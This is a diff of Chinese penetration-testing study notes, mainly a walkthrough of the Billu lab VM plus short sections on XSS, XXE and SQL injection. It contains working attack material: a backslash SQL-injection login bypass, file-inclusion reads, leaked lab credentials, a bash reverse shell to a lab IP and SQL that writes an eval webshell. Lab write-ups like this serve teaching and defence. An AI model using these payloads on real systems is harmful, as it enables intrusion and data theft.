@@ -22,7 +22,7 @@ nmap -T4 -A -v 192.168.2.128-253 -p 22,80
 - -v 事无巨细，全部输出。
 - -p- 全端口， -p 指定端口。实战中不知道端口就先全端口，再缩小范围。
 
-|![Billu01-nmap](./images/Billu01-nmap.png)|
+|![nmap扫描结果](./images/Billu01-nmap.png)|
 |:--:|
 | nmap -T4 -A -v 192.168.2.128-253 -p 22,80 |
 
@@ -30,7 +30,7 @@ nmap -T4 -A -v 192.168.2.128-253 -p 22,80
   在实战中基本不会用弱口令字典爆破。会触发报警、有试错锁定机制。
 - 80/tcp
   可以观察网页，找网页上有用户交互的组件：登录、搜索。可能有SQL注入。使用单引号测试注入点。SQL注入防御的最佳方法是预处理函数，就是SQL语句前对输入进行预处理。
-  |![Billu02-80tcp](./images/Billu02-80tcp.png)|
+  |![访问IP:Port](./images/Billu02-80tcp.png)|
   |:--:|
   | http://192.168.2.128/ |
 
@@ -62,22 +62,79 @@ dirsearch扫描结果和利用思路如下。
 
 ## Burpsuite重放+修改请求方法 利用文件包含漏洞
 
-访问/test?file=/etc/passwd，发现不是GET方法。
+漏洞验证POC（Proof of Concept）
+漏洞利用EXP（Exploit）
+1. 测试访问/test?file=/etc/passwd，界面没有变化，说明不是GET方法。  
 
-访问/test，Burpsuite抓包，右键发送到repeater。
-右键修改请求方法，即GET改为POST。
-包头最下，空一行，写入file=/etc/passwd。
-回包可见账号。此时已验证存在文件包含漏洞。
+2. 测试访问/test?file=/etc/passwd，Burpsuite抓包，右键发送到repeater。 键修改请求方法，即GET改为POST。（包头最下，空一行，写入file=/etc/passwd或者）。    
 
-用此法可以包含其他源代码文件，进而代码审计。
+3. 回包可见账号。此时已验证存在文件包含漏洞。利用文件包含漏洞做代码审计。
 
-/index.php 可以用一种万能密码。用\转义符影响SQL的语义。
-/c.php 连数据库的。得到地址、账号、密码、库名。
-/phpmy 可以登录。
+    |![验证文件包含漏洞](./images/Billu03-POC.png)|
+    |:--:|
+    | 用此法可以包含其他源代码文件，进而代码审计。 |
+     
 
-### getshell拿目标系统的cli
+### 审计/index.php 
 
-RCE
+利用文件包含漏洞，可以看到index.php源代码。
+
+|![利用文件包含漏洞读取index.php源代码](./images/Billu04-EXP-login.png)|
+|:--:|
+| 获取index.php源代码 |
+
+详细代码见[./src/Billu-index.php](./src/Billu-index.php)
+```php
+$run = 'select * from auth where  pass=\''  .$pass  .'\' and uname=\''  .$uname  .'\'';	
+// " select * from auth where pass='$pass' and uname='$uname' "
+```
+
+
+仅对输入做单引号过滤，考虑构造一种万能密码，用\转义符影响SQL的语义。构造 \$pass=\并且\$uname=or 1=1#，那么得到的SQL就变成了密码是' and uname=此后恒为真。
+```php
+$run = " select * from auth where pass='\' and uname=' or 1=1#' "
+```
+
+|![登录后的欢迎界面](./images/Billu04-EXP-welcome.png)|
+|:--:|
+| http://192.168.2.128/panel.php |
+
+### 审计 /c.php
+
+测试访问/c/index.html或者/c/index.php不存在，提示是c.php，继续代码审计。
+
+|![验证/c是/c.php](./images/Billu05-POC-c.png)|
+|:--:|
+| /c是c.php |
+
+|![利用文件包含漏洞读取c.php源代码](./images/Billu05-EXP-c.png)|
+|:--:|
+| c.php源代码可见连接数据库信息 |
+
+得到数据库的地址、账号"billu"、密码"b0x_billu"、库名"ica_lab"等重要信息。
+
+## 审计/phpmy 可以登录。
+
+测试/phpmy发现是phpmyadmin数据库管理平台，可以用上一步得到的账号"billu"、密码"b0x_billu"登录。"ica_lab"数据库有auth、download、users三张表，其中auth表可以见明文的账号biLLu、密码hEx_it。
+
+|![登录phpmyadmin](./images/Billu06-phpmy.png)|
+|:--:|
+| phpmyadmin |
+
+
+## 审计/show.php，尝试getshell
+
+登录后的/panel.php有2种操作Show Users和Add Users。panel.php源代码在[./src/Billu-panel.php](./src/Billu-panel.php)。
+
+|![Show Users功能](./images/Billu07-ShowUsers.png)|
+|:--:|
+| Show Users |
+
+|![Add Users功能](./images/Billu07-AddUsers.png)|
+|:--:|
+| Add Users |
+
+远程代码执行RCE (Remote Code Execution)。
 关注函数：system()、exec()、shell_exec()、eval()、assert()。
 
 使用命令制作图片马。上传一个图片，抓包。
@@ -89,7 +146,7 @@ copy pic.jpg/b + muma.php/a shell.jpg
 
 bash + nc
 
-### 提权
+## 提权
 
 提权思路：SUID、sudo、环境变量、内核提权、计划任务。
 
@@ -133,7 +190,9 @@ bash + nc
   bash -i >& 192.168.2.138:8888 0>&1
   ```
 
-### 数据库直接写木马
+---
+
+## 数据库直接写木马
 
 拿到数据库管理权限后，可以执行
 ```sql
@@ -145,7 +204,7 @@ select '<?php @eval($_POST[x]);?>' into outfile '/var/www/shell.php';
 ```
 还要解决操作系统权限。
 
-### 数据库通过日志写木马
+## 数据库通过日志写木马
 拿到数据库管理权限后，可以执行
 ```sql
 show global variables like "%log%"; # 查看参数
@@ -153,8 +212,9 @@ set global general_log='on'; # 开启写日志
 set global general_log_file='/var/www/shell.php'; # 写到www目录的php文件里
 select '<?php @eval($_POST[x]);?>'； # 查询一次，查询内容写到日志文件里
 ```
+---
 
-## 专题一：XSS案例
+# 专题一：XSS案例
 
 | 机器 | IP |
 |:------|:------|
@@ -162,7 +222,7 @@ select '<?php @eval($_POST[x]);?>'； # 查询一次，查询内容写到日志�
 | 目标虚拟机 | 192.168.2.153 |
 | Windows宿主机 | 192.168.2.222 |
 
-### XSS漏洞利用
+## XSS漏洞利用
 
 留言功能组件特点：输入的内容会显示在网站上，JavaScript或HTML。
 
@@ -186,7 +246,7 @@ select '<?php @eval($_POST[x]);?>'； # 查询一次，查询内容写到日志�
     不需要登录。访问管理页面，用Hacker Bar V2，勾选cookie，将cookie值写进去。
     可以直接登录进去。
 
-### SQL注入
+## SQL注入
 
 测试注入点，测试显示位置，读取文件。读取文件的load_file()函数支持16进制，联合使用unhex()函数。
 ```sql
@@ -195,7 +255,7 @@ union select load_file('/tmp/key3')
 union select load_file(unhex('272f746d702f6b65793327')) # 解密后还是/tmp/key3
 ```
 
-## 专题一：XXE案例
+# 专题一：XXE案例
 
 XML External Entity Injection，XML外部实体注入
 
@@ -221,15 +281,15 @@ Burpsuite抓包，表单提交XML数据。修改XML表单数据。
 
 
 
-## 专题二：内网渗透实战
+# 专题二：内网渗透实战
 
-## 专题二：在线靶场
+# 专题二：在线靶场
 http://39.103.63.109:8001/
 http://39.103.63.109:8005/
 1、渗透后不要留后门文件。
 2、不要删文件、不要修改源代码。
 
-## 专题二：docker靶场.zip
+# 专题二：docker靶场.zip
 
 php框架漏洞：thinkphp、laravel、Yii
 java框架漏洞：strusts2、spring
@@ -245,7 +305,7 @@ docker ps # 查看web端口
 水滴工具箱有科学上网工具clash verge？选择虚拟网卡模式，点代理，点全局。
 
 
-## 专题二：自动化漏洞扫描
+# 专题二：自动化漏洞扫描
 1、常见漏扫软件
 开源漏扫软件nuclei、xray。可以去github下载。
 商业漏扫：AWVS、APPScan
@@ -385,6 +445,7 @@ public_pem = rsa.publickey().exportKey()
 with open('public.pem', 'wb') as f:
     f.write(public_pem)
 ```
+
 
 ## 使用python代码加密
 ```python
